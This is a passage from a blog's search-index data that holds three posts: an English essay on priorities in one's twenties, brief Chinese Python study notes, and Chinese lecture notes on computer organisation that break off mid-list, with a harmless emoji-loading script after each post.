});","tags":[{"name":"英语","slug":"英语","permalink":"https://marnm.github.io/tags/英语/"}]},{"title":"In Your 20's These Things Matter More Than You Think","date":"2020-08-18T12:54:13.000Z","path":"/posts/4def9c28/","text":"In my twenties, I had no idea what would matter long term. I&#x2019;m a smart person, but I didn&#x2019;t think much about my future. I lived moment to moment, without much thought or planning. Instead, I put my energy into what I thought mattered at the time. Getting good grades, dating, friends, going out to bars, and my appearance were top of the list. Now, at 41, with the benefit of hindsight, I can see that some of my decisions mattered a lot. If I could go back and do my twenties again, I&#x2019;d use my energy in quite a different way. Here are some things that are more important long-term that I realized: Developing you marketable skills I was accepted into two amazing Master&#x2019;s programs. The topics were exciting, but I turned them both down for a teaching position. I&#x2019;d already spent 5 years at university and if felt irresponsible studying for so long. I&#x2019;ll do my Masters later, I thought. I should probably be an adult and take this job. What I didn&#x2019;t realize is how much harder it is to study later in life. I know people who are studying while parenting and working, but it&#x2019;s tough. Life gets busier and more complex. Not everyone needs to get a degree, of course, but the world is competitive. Getting the highest level of education you are able to (and want to) can give you an advantage Having a tertiary education or specialized training makes it easier to get work later, and the jobs available to you are often more interesting, creative, and satisfying. Spending your time wisely I spent a lot of energy in my early 20&#x2019;s on relationships that I knew were going nowhere. Most of my free time was taken up by my boyfriends &#x2014;&#x2014; time I could have spent exploring hobbies, going on adventures with friends, meeting new people, and pursuing my own interests. I knew early on I wasn&#x2019;t going to marry these guys. The time I invested in those relationships was mostly wasted. Instead of keeping my boyfriends happy, I could have used that time to work on becoming the person I wanted to be. That&#x2019;s one of your main jobs in this time of life. In my 20&#x2019;s I thought I&#x2019;d just &#x201C;find myself&#x201D; but it doesn&#x2019;t work like that. What I&#x2019;ve realized is you don&#x2019;t find yourself, you create yourself. You decide who you want to be, what kind of life you want, and create that for yourself. Saying yes or no to love Learning what makes a good relationship matters. At 23, I got engaged after six months of dating. Looking back, I barely knew my ex, but it didn&#x2019;t feel like it mattered. It felt romantic and intense. It felt like the next logical stage in my life &#x2014;&#x2014; mid twenties, get married, have kids, get a house&#x2026; I didn&#x2019;t know about stages of love, red flags, toxic patterns of communication, how to deal with conflict well, chemistry and compatibility, or how to make a marriage work. I was very green and it mattered more than I realized. Who you choose to say &#x201C;yes&#x201D; to makes a huge impact on your life for many years. Arm yourself with knowledge to choose well. Facing your demons Like many young people, I had issues left over from childhood that I didn&#x2019;t want to face. I thought I was doing what was best: forget it and move on! But by not dealing with my past, I made life harder for myself that it needed to be. Not dealing with my problems had consequences. In my social life and relationships it meant I worked to hard to please people. In my work and study, it meant I pushed myself to exhaustion. It wasn&#x2019;t until a few years ago that I realized how important it is to deal with and take responsibility for your own issues. Ignoring your past issues can leave you vulnerable to depression, anxiety, low self-worth, and low self-awareness. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"英语","slug":"英语","permalink":"https://marnm.github.io/tags/英语/"}]},{"title":"Python学习笔记","date":"2020-04-09T13:47:40.000Z","path":"/posts/297a89d9/","text":"&#x5B89;&#x88C5;&#x76F4;&#x63A5;&#x53BB;&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5C31;&#x884C;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4ECB;&#x7ECD;&#x5B89;&#x88C5;&#x6B65;&#x9AA4;&#x4E86;&#x3002; &#x63A8;&#x8350;&#x4E66;&#x5355;&#x300A;&#x7B80;&#x660E;Python&#x6559;&#x7A0B;&#x300B;https://python.swaroopch.com/ Python&#x7F16;&#x7801;&#x89C4;&#x8303;&#xFF08;&#x5B98;&#x65B9;&#xFF09;https://peps.python.org/pep-0008/ &#x300A;Python&#x6838;&#x5FC3;&#x7F16;&#x7A0B;&#x300B;[&#x7F8E;] Wesley Chun &#x300A;Python&#x6A21;&#x5757;&#x8BE6;&#x89E3;&#x300B;Google Code Archive - Long-term storage for Google Code Project Hosting. &#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x65B9;&#x5411;Python&#x80FD;&#x505A;&#x7684;&#x4E8B;&#x592A;&#x591A;&#x4E86;&#xFF0C;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x70ED;&#x95E8;&#x7684;&#x9886;&#x57DF; &#x722C;&#x866B; &#x5927;&#x6570;&#x636E;&#x5206;&#x6790; &#x81EA;&#x52A8;&#x5316;&#x6D4B;&#x8BD5; &#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4; &#x4EBA;&#x5DE5;&#x667A;&#x80FD; &#x6DF1;&#x5EA6;&#x5B66;&#x4E60; &#x673A;&#x5668;&#x5B66;&#x4E60; &#x56FE;&#x50CF;&#x5904;&#x7406; &#x56FE;&#x50CF;&#x8BC6;&#x522B; &#x81EA;&#x52A8;&#x5316;&#x529E;&#x516C; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Python","slug":"Python","permalink":"https://marnm.github.io/tags/Python/"}]},{"title":"计算机组成原理","date":"2020-02-14T12:52:36.000Z","path":"/posts/8d4b7ae1/","text":"2.14&#xFF0C;&#x53BB;**&#x7684;&#x60C5;&#x4EBA;&#x8282;&#xFF0C;&#x8FD8;&#x662F;&#x7535;&#x8111;&#x597D;&#x73A9; &#x6211;&#x5410;&#x4E86;&#xFF0C;&#x7EC4;&#x6210;&#x539F;&#x7406;&#x771F;&#x662F;&#x5927;&#x5B66;&#x6700;&#x75DB;&#x82E6;&#x7684;&#x8BFE;&#x7A0B;&#x4E4B;&#x4E00;&#xFF0C;&#x592A;&#x96BE;&#x4E86;o(&#x2565;&#xFE4F;&#x2565;)o &#x8BA1;&#x7B97;&#x673A;&#x7EC4;&#x6210; &#x4E00; &#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x6982;&#x8BBA;&#x786C;&#x4EF6;&#xFF1A;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x5B9E;&#x4F53;&#xFF0C;&#x5982;&#x4E3B;&#x673A;&#xFF0C;&#x5916;&#x8BBE;&#x7B49; &#x8F6F;&#x4EF6;&#xFF1A;&#x5177;&#x6709;&#x5404;&#x7C7B;&#x7279;&#x6B8A;&#x529F;&#x80FD;&#x7684;&#x4FE1;&#x606F;&#xFF08;&#x7A0B;&#x5E8F;&#xFF09;&#x7EC4;&#x6210; &#x8F6F;&#x4EF6;&#x7C7B;&#x578B; &#x5B9A;&#x4E49; &#x4E3E;&#x4F8B; &#x7CFB;&#x7EDF;&#x8F6F;&#x4EF6; &#x7528;&#x6765;&#x7BA1;&#x7406;&#x6574;&#x4E2A;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF; &#x6807;&#x51C6;&#x7A0B;&#x5E8F;&#x5E93;&#xFF0C;&#x8BED;&#x8A00;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x7F51;&#x7EDC;&#x8F6F;&#x4EF6; &#x5E94;&#x7528;&#x8F6F;&#x4EF6; &#x6309;&#x4EFB;&#x52A1;&#x9700;&#x8981;&#x7F16;&#x5236;&#x6210;&#x7684;&#x5404;&#x79CD;&#x7A0B;&#x5E8F; &#x79D1;&#x5B66;&#x8BA1;&#x7B97;&#x7A0B;&#x5E8F;&#xFF0C;&#x6570;&#x636E;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#xFF0C;&#x8FC7;&#x7A0B;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#xFF0C;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x7A0B;&#x5E8F; &#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x7684;&#x5C42;&#x6B21;&#x7ED3;&#x6784; &#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x7684;&#x4F53;&#x7CFB;&#x7ED3;&#x6784; &#x5206;&#x7C7B; &#x533A;&#x522B; &#x5B9A;&#x4E49; &#x8BA1;&#x7B97;&#x673A;&#x4F53;&#x7CFB;&#x7ED3;&#x6784; &#x6709;&#x65E0;&#x4E58;&#x6CD5;&#x6307;&#x4EE4; &#x7A0B;&#x5E8F;&#x5458;&#x89C1;&#x5230;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x5373;&#x6982;&#x5FF5;&#x6027;&#x7684;&#x7ED3;&#x6784;&#x548C;&#x529F;&#x80FD;&#x7279;&#x6027;&#xFF08;&#x6307;&#x4EE4;&#x7CFB;&#x7EDF;&#xFF0C;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x5BFB;&#x5740;&#x6280;&#x672F;&#xFF0C;I/O&#x673A;&#x7406;&#xFF09; &#x8BA1;&#x7B97;&#x673A;&#x7EC4;&#x6210; &#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x4E58;&#x6CD5;&#x6307;&#x4EE4; &#x5B9E;&#x73B0;&#x8BA1;&#x7B97;&#x673A;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#x6240;&#x4F53;&#x73B0;&#x7684;&#x5C5E;&#x6027;&#xFF08;&#x5177;&#x4F53;&#x6307;&#x4EE4;&#x7684;&#x5B9E;&#x73B0;&#xFF09; &#x51AF;.&#x8BFA;&#x4F9D;&#x66FC;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x7279;&#x70B9; &#x8BA1;&#x7B97;&#x673A;&#x7531;&#x8FD0;&#x7B97;&#x5668;&#xFF0C;&#x5B58;&#x50A8;&#x5668;&#xFF0C;&#x63A7;&#x5236;&#x5668;&#xFF0C;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x548C;&#x8F93;&#x51FA;&#x8BBE;&#x5907;&#x4E94;&#x5927;&#x90E8;&#x5206;&#x7EC4;&#x6210; &#x6307;&#x4EE4;&#x548C;&#x6570;&#x636E;&#x4EE5;&#x540C;&#x7B49;&#x5730;&#x4F4D;&#x5B58;&#x653E;&#x4E0E;&#x5B58;&#x50A8;&#x5668;&#x5185;&#xFF0C;&#x5E76;&#x53EF;&#x6309;&#x5730;&#x5740;&#x5BFB;&#x8BBF; &#x6307;&#x4EE4;&#x548C;&#x6570;&#x636E;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x8868;&#x793A; &#x6307;&#x4EE4;&#x7531;&#x64CD;&#x4F5C;&#x7801;&#x548C;&#x5730;&#x5740;&#x7801;&#x7EC4;&#x6210; &#x5B58;&#x50A8;&#x7A0B;&#x5E8F; &#x4EE5;&#x8FD0;&#x7B97;&#x5668;&#x4E3A;&#x4E2D;&#x5FC3; &#x51AF;.&#x8BFA;&#x4F9D;&#x66FC;&#x8BA1;&#x7B97;&#x673A;&#x786C;&#x4EF6;&#x6846;&#x56FE; &#x73B0;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x786C;&#x4EF6;&#x6846;&#x56FE; &#x8BBE;&#x67D0;&#x673A;&#x7684;&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x4E3A;16&#x4F4D;&#xFF0C;&#x5176;&#x4E2D;&#x64CD;&#x4F5C;&#x7801;&#x5360;6&#x4F4D;&#xFF0C;&#x5730;&#x5740;&#x7801;&#x5360;10&#x4F4D;&#x3002; &#x64CD;&#x4F5C;&#x7801; &#x64CD;&#x4F5C;&#x6027;&#x8D28; &#x5177;&#x4F53;&#x5185;&#x5BB9; 000001 &#x53D6;&#x6570; &#x5C06;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x53D6;&#x5230;&#x8FD0;&#x7B97;&#x5668;&#x7684;&#x7D2F;&#x52A0;&#x5668;ACC&#x4E2D; 000010 &#x5B58;&#x6570; &#x5C06;ACC&#x4E2D;&#x7684;&#x6570;&#x5B58;&#x81F3;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D; 000011 &#x52A0; &#x5C06;ACC&#x4E2D;&#x7684;&#x6570;&#x4E0E;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x7684;&#x6570;&#x76F8;&#x52A0;&#xFF0C;&#x7ED3;&#x679C;&#x5B58;&#x4E8E;ACC&#x4E2D; 000100 &#x4E58; &#x5C06;ACC&#x4E2D;&#x7684;&#x6570;&#x4E0E;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x7684;&#x6570;&#x76F8;&#x4E58;&#xFF0C;&#x7ED3;&#x679C;&#x5B58;&#x4E8E;ACC&#x4E2D; 000101 &#x6253;&#x5370; &#x5C06;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x64CD;&#x4F5C;&#x6570;&#x6253;&#x5370;&#x8F93;&#x51FA; &#x5B58;&#x50A8;&#x5668;&#x7684;&#x57FA;&#x672C;&#x7EC4;&#x6210; &#x7EC4;&#x6210; &#x89E3;&#x91CA; &#x5B58;&#x50A8;&#x5355;&#x5143; &#x5B58;&#x653E;&#x4E00;&#x4E32;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801; &#x5B58;&#x50A8;&#x5B57; &#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x7684;&#x7EC4;&#x5408; &#x5B58;&#x50A8;&#x5B57;&#x957F; &#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x7684;&#x4F4D;&#x6570;&#x6BCF;&#x4E2A;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x8D4B;&#x4E88;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x53F7; MAR &#x5B58;&#x50A8;&#x5668;&#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x53CD;&#x6620;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x7684;&#x4E2A;&#x6570; 2**n MDR &#x5B58;&#x50A8;&#x5668;&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x53CD;&#x6620;&#x5B58;&#x50A8;&#x5B57;&#x957F; n &#x8FD0;&#x7B97;&#x5668;&#x57FA;&#x672C;&#x7EC4;&#x6210; &#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x64CD;&#x4F5C;&#x6570;&#xFF0C;&#x8FD0;&#x7B97; &#x52A0;&#x6CD5; &#x51CF;&#x6CD5; &#x4E58;&#x6CD5; &#x9664;&#x6CD5; ACC &#x88AB;&#x52A0;&#x6570;&#x53CA;&#x548C; &#x88AB;&#x51CF;&#x6570;&#x53CA;&#x5DEE; &#x4E58;&#x79EF;&#x9AD8;&#x4F4D; &#x88AB;&#x9664;&#x6570;&#x53CA;&#x4F59;&#x6570; MQ &#x4E58;&#x6570;&#x53CA;&#x4E58;&#x79EF;&#x4F4E;&#x4F4D; &#x5546; X &#x52A0;&#x6570; &#x51CF;&#x6570; &#x88AB;&#x4E58;&#x6570; &#x9664;&#x6570; &#x63A7;&#x5236;&#x5668;&#x7684;&#x57FA;&#x672C;&#x7EC4;&#x6210; | &#x7B80;&#x79F0; | &#x610F;&#x4E49; | &#x4F5C;&#x7528; | &#x89E3;&#x91CA; || PC | &#x53D6;&#x6307;&#x4EE4; | &#x53D6;&#x6307;&#xFF0C;&#x8BBF;&#x5B58; | &#x5B58;&#x653E;&#x5F53;&#x524D;&#x6B32;&#x6267;&#x884C;&#x6307;&#x4EE4;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5177;&#x6709;&#x8BA1;&#x6570;&#x529F;&#x80FD;(PC)+1-&gt;pc || IR | &#x5206;&#x6790;&#x6307;&#x4EE4; | &#x53D6;&#x6307;&#xFF0C;&#x8BBF;&#x5B58; | &#x5B58;&#x653E;&#x5F53;&#x524D;&#x6B32;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4; || CU | &#x6267;&#x884C;&#x6307;&#x4EE4; | &#x6267;&#x884C;&#xFF0C;&#x8BBF;&#x5B58; | &#x63A7;&#x5236;&#x5355;&#x5143; | &#x4EE5;&#x53D6;&#x6570;&#x6307;&#x4EE4;&#x4E3A;&#x4F8B; &#x7A0B;&#x5E8F;&#x9996;&#x5730;&#x5740;PC&#x53D6;&#x6307;&#x4EE4;&#xFF1A;PC-&gt;MAR-&gt;&#x5B58;&#x50A8;&#x4F53;M-MDR-&gt;IR&#x5206;&#x6790;&#x6307;&#x4EE4;&#xFF1A;IR-&gt;CU&#x6267;&#x884C;&#x6307;&#x4EE4;&#xFF1A;IR-&gt;MAR-&gt;M-&gt;MDR-&gt;ACC &#x8BA1;&#x7B97;&#x673A;&#x786C;&#x4EF6;&#x7684;&#x4E3B;&#x8981;&#x6280;&#x672F;&#x6307;&#x6807; &#x673A;&#x5668;&#x5B57;&#x957F;&#xFF1A;CPU&#x4E00;&#x6B21;&#x80FD;&#x5904;&#x7406;&#x6570;&#x636E;&#x7684;&#x4F4D;&#x6570;&#xFF0C;&#x4E0E;CPU&#x4E2D;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x4F4D;&#x6570;&#x6709;&#x5173;&#x3002; &#x8FD0;&#x7B97;&#x901F;&#x5EA6;&#xFF1A;&#x4E3B;&#x9891;&#xFF0C;&#x5409;&#x666E;&#x68EE;&#x6CD5;(&#x6BCF;&#x6761;&#x6307;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x4ED6;&#x4EEC;&#x5728;&#x5168;&#x90E8;&#x64CD;&#x4F5C;&#x4E2D;&#x6240;&#x5360;&#x7684;&#x767E;&#x5206;&#x6BD4;TM=&#x2211;ni=1fitiTM=&#x2211;i=1nfiti)&#xFF0C;MIPS(&#x767E;&#x4E07;&#x6761;&#x6307;&#x4EE4;&#x6BCF;&#x79D2;),CPI(&#x6267;&#x884C;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x6240;&#x9700;&#x65F6;&#x949F;&#x5468;&#x671F;&#x6570;)&#xFF0C;FLOPS(&#x6BCF;&#x79D2;&#x6D6E;&#x70B9;&#x8FD0;&#x7B97;&#x6B21;&#x6570;) &#x5B58;&#x50A8;&#x5BB9;&#x91CF;(&#x5B58;&#x653E;&#x4E8C;&#x8FDB;&#x5236;&#x4FE1;&#x606F;&#x7684;&#x603B;&#x4F4D;&#x6570;) &#x5206;&#x7C7B; &#x7EC4;&#x6210; &#x4E3B;&#x5B58;&#x5BB9;&#x91CF; &#x5B58;&#x50A8;&#x5355;&#x5143;&#xD7;&#x5B57;&#x8282;&#x6570; &#x4E3B;&#x5B58;&#x5BB9;&#x91CF; &#x5B57;&#x8282;&#x6570; &#x8F85;&#x5B58;&#x5BB9;&#x91CF; &#x5B57;&#x8282;&#x6570; &#x6307;&#x4EE4;&#x548C;&#x6570;&#x636E;&#x90FD;&#x5B58;&#x4E8E;&#x5B58;&#x50A8;&#x5668;&#x4E2D;&#xFF0C;&#x8BA1;&#x7B97;&#x673A;&#x5982;&#x4F55;&#x533A;&#x5206;&#x5B83;&#x4EEC;&#xFF1F;1.&#x901A;&#x8FC7;&#x4E0D;&#x540C;&#x7684;&#x65F6;&#x95F4;&#x6BB5;&#xFF0C;&#x5728;&#x53D6;&#x6307;&#x4EE4;&#x9636;&#x6BB5;&#x53D6;&#x51FA;&#x7684;&#x4E3A;&#x6307;&#x4EE4;&#xFF0C;&#x5728;&#x6267;&#x884C;&#x6307;&#x4EE4;&#x9636;&#x6BB5;&#x53D6;&#x51FA;&#x4E3A;&#x6570;&#x636E;2.&#x901A;&#x8FC7;&#x5730;&#x5740;&#x6E90;&#xFF1A;&#x7531;PC&#x63D0;&#x4F9B;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x5730;&#x5740;&#x7684;&#x53D6;&#x51FA;&#x7684;&#x662F;&#x6307;&#x4EE4;&#xFF0C;&#x7531;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x63D0;&#x4F9B;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x5730;&#x5740;&#x53D6;&#x51FA;&#x7684;&#x662F;&#x64CD;&#x4F5C;&#x6570;&#x3002; &#x4E8C; &#x8BA1;&#x7B97;&#x673A;&#x7684;&#x53D1;&#x5C55;&#x53CA;&#x5E94;&#x7528; Moore&#xFF08;&#x6469;&#x5C14;&#xFF09;&#x5B9A;&#x5F8B;&#xFF1A;&#x5FAE;&#x82AF;&#x4E0A;&#x96C6;&#x6210;&#x7684;&#x6676;&#x4F53;&#x7BA1;&#x6570;&#x76EE;&#x6BCF;&#x4E09;&#x5E74;&#x7FFB;&#x4E24;&#x756A; &#x8BA1;&#x7B97;&#x673A;&#x7684;&#x5E94;&#x7528; &#x4E00;&#x3001;&#x79D1;&#x5B66;&#x8BA1;&#x7B97;&#x548C;&#x6570;&#x636E;&#x5904;&#x7406; &#x4E8C;&#x3001;&#x5DE5;&#x4E1A;&#x63A7;&#x5236;&#x548C;&#x5B9E;&#x65F6;&#x63A7;&#x5236; &#x4E09;&#x3001;&#x7F51;&#x7EDC;&#x6280;&#x672F; &#x7535;&#x5B50;&#x5546;&#x52A1; &#x7F51;&#x7EDC;&#x6559;&#x80B2; &#x654F;&#x6377;&#x5236;&#x9020; &#x56DB;&#x3001;&#x865A;&#x62DF;&#x73B0;&#x5B9E; &#x4E94;&#x3001;&#x529E;&#x516C;&#x81EA;&#x52A8;&#x5316;&#x548C;&#x7BA1;&#x7406;&#x4FE1;&#x606F;&#x7CFB;&#x7EDF; &#x516D;&#x3001;CAD/CAM/CIMS &#x4E03;&#x3001;&#x591A;&#x5A92;&#x4F53;&#x6280;&#x672F; &#x516B;&#x3001;&#x4EBA;&#x5DE5;&#x667A;&#x80FD; &#x82AF;&#x7247;&#x96C6;&#x6210;&#x5EA6;&#x7684;&#x63D0;&#x9AD8;&#x53D7;&#x4EE5;&#x4E0B;&#x4E09;&#x65B9;&#x9762;&#x7684;&#x9650;&#x5236; &#x82AF;&#x7247;&#x96C6;&#x6210;&#x5EA6;&#x53D7;&#x7269;&#x7406;&#x6781;&#x9650;&#x7684;&#x5236;&#x7EA6; &#x6309;&#x51E0;&#x4F55;&#x7EA7;&#x6570;&#x9012;&#x589E;&#x7684;&#x5236;&#x4F5C;&#x6210;&#x672C; &#x82AF;&#x7247;&#x7684;&#x529F;&#x8017;&#x3001;&#x6563;&#x70ED;&#x3001;&#x7EBF;&#x5EF6;&#x8FDF; &#x8BA1;&#x7B97;&#x673A; &#x4EE3;&#x66FF;&#x90E8;&#x5206; &#x5149;&#x8BA1;&#x7B97;&#x673A; &#x5229;&#x7528;&#x5149;&#x5B50;&#x53D6;&#x4EE3;&#x7535;&#x5B50;&#x8FDB;&#x884C;&#x8FD0;&#x7B97;&#x548C;&#x5B58;&#x50A8; DNA&#x751F;&#x7269;&#x8BA1;&#x7B97;&#x673A; &#x901A;&#x8FC7;&#x63A7;&#x5236;DNA&#x5206;&#x5B50;&#x95F4;&#x7684;&#x751F;&#x5316;&#x53CD;&#x5E94; &#x91CF;&#x5B50;&#x8BA1;&#x7B97;&#x673A; &#x5229;&#x7528;&#x539F;&#x5B50;&#x6240;&#x5177;&#x6709;&#x7684;&#x91CF;&#x5B50;&#x7279;&#x6027; &#x4E09; &#x7CFB;&#x7EDF;&#x603B;&#x7EBF; &#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x4E94;&#x5927;&#x90E8;&#x4EF6;&#x4E4B;&#x95F4;&#x7684;&#x4E92;&#x8FDE;&#x7684;&#x65B9;&#x5F0F;&#x6709;&#x4E24;&#x79CD; &#x5206;&#x6563;&#x8FDE;&#x63A5;&#xFF1A;&#x5404;&#x90E8;&#x4EF6;&#x4E4B;&#x95F4;&#x4F7F;&#x7528;&#x5355;&#x72EC;&#x7684;&#x8FDE;&#x7EBF; &#x603B;&#x7EBF;&#x8FDE;&#x63A5;&#xFF1A;&#x5C06;&#x5404;&#x90E8;&#x4EF6;&#x8FDE;&#x5230;&#x4E00;&#x7EC4;&#x516C;&#x5171;&#x4FE1;&#x606F;&#x4F20;&#x8F93;&#x7EBF;&#x4E0A; &#x603B;&#x7EBF;&#xFF1A;&#x8FDE;&#x63A5;&#x5404;&#x4E2A;&#x90E8;&#x4EF6;&#x7684;&#x4FE1;&#x606F;&#x4F20;&#x8F93;&#x7EBF;&#xFF0C;&#x662F;&#x5404;&#x4E2A;&#x90E8;&#x4EF6;&#x5171;&#x4EAB;&#x7684;&#x4F20;&#x8F93;&#x4ECB;&#x8D28; &#x603B;&#x7EBF;&#x4F20;&#x8F93;&#x7279;&#x70B9;&#xFF1A;&#x67D0;&#x4E00;&#x65F6;&#x523B;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x8DEF;&#x4FE1;&#x606F;&#x5728;&#x603B;&#x7EBF;&#x4E0A;&#x4F20;&#x8F93;&#xFF0C;&#x5373;&#x5206;&#x65F6;&#x4F7F;&#x7528;&#x3002;&#x4E3A;&#x4E86;&#x51CF;&#x8F7B;&#x603B;&#x7EBF;&#x8D1F;&#x8F7D;&#xFF0C;&#x603B;&#x7EBF;&#x4E0A;&#x7684;&#x90E8;&#x4EF6;&#x5E94;&#x901A;&#x8FC7;&#x4E09;&#x6001;&#x9A71;&#x52A8;&#x7F13;&#x51B2;&#x7535;&#x8DEF;&#x4E0E;&#x603B;&#x7EBF;&#x76F8;&#x8FDE; &#x603B;&#x7EBF;&#x4E0A;&#x4FE1;&#x606F;&#x7684;&#x4F20;&#x8F93;&#xFF1A; &#x4E32;&#x884C;&#xFF1A;&#x6BCF;&#x6761;&#x7EBF;&#x53EF;&#x4E00;&#x4F4D;&#x4E00;&#x4F4D;&#x7684;&#x4F20;&#x8F93;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#xFF0C;&#x4E00;&#x4E32;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x53EF;&#x5728;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#x9010;&#x4E00;&#x4F20;&#x8F93;&#x5B8C;&#x6210; &#x5E76;&#x884C;&#xFF1A;&#x82E5;&#x5E72;&#x6761;&#x4F20;&#x8F93;&#x7EBF;&#x540C;&#x65F6;&#x4F20;&#x8F93;&#x82E5;&#x5E72;&#x6761;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801; &#x9762;&#x5411; CPU &#x7684;&#x53CC;&#x603B;&#x7EBF;&#x7ED3;&#x6784;&#x6846;&#x56FE; &#x5355;&#x603B;&#x7EBF;&#x7ED3;&#x6784;&#x6846;&#x56FE; &#x4EE5;&#x5B58;&#x50A8;&#x5668;&#x4E3A;&#x4E2D;&#x5FC3;&#x7684;&#x53CC;&#x603B;&#x7EBF;&#x7ED3;&#x6784;&#x6846;&#x56FE; &#x603B;&#x7EBF;&#x5206;&#x7C7B; &#x89E3;&#x91CA; &#x7247;&#x5185;&#x603B;&#x7EBF; &#x82AF;&#x7247;&#x5185;&#x90E8;&#x7684;&#x603B;&#x7EBF;,&#x5982;&#x5BC4;&#x5B58;&#x5668;&#x4E0E;&#x5BC4;&#x5B58;&#x5668;&#x4E4B;&#x95F4;,&#x5BC4;&#x5B58;&#x5668;&#x4E0E;&#x7B97;&#x903B;&#x5355;&#x5143;ALU&#x4E4B;&#x95F4;&#x3002; &#x7CFB;&#x7EDF;&#x603B;&#x7EBF; &#x8BA1;&#x7B97;&#x673A;&#x5404;&#x90E8;&#x4EF6;&#x4E4B;&#x95F4;&#x7684;&#x4FE1;&#x606F;&#x4F20;&#x8F93;&#x7EBF;(CPU,&#x4E3B;&#x5B58;,I/O&#x8BBE;&#x5907;&#x7B49;) &#x7CFB;&#x7EDF;&#x603B;&#x7EBF;-&#x6570;&#x636E;&#x603B;&#x7EBF; &#x53CC;&#x5411;&#x4F20;&#x8F93;,&#x5176;&#x4F4D;&#x6570;&#x4E0E;&#x673A;&#x5668;&#x5B57;&#x957F;,&#x5B58;&#x50A8;&#x5B57;&#x957F;&#x6709;&#x5173; &#x7CFB;&#x7EDF;&#x603B;&#x7EBF;-&#x5730;&#x5740;&#x603B;&#x7EBF; &#x5355;&#x5411;&#xFF0C;&#x4E0E;&#x5B58;&#x50A8;&#x5730;&#x5740;,I/O&#x5730;&#x5740;&#x6709;&#x5173; &#x7CFB;&#x7EDF;&#x603B;&#x7EBF;-&#x63A7;&#x5236;&#x603B;&#x7EBF; 